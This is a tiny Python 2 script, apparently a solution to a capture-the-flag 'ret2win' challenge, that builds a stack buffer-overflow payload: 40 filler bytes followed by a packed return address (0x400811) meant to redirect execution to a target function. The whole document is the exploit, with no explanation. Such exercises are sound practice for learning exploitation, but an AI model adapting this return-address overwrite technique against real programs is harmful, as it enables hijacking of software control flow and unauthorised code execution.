import struct 

ret2win_addr = struct.pack("L", 0x0000000000400811)
pattern = "\x42" * 40
exploit = pattern + ret2win_addr
print exploit
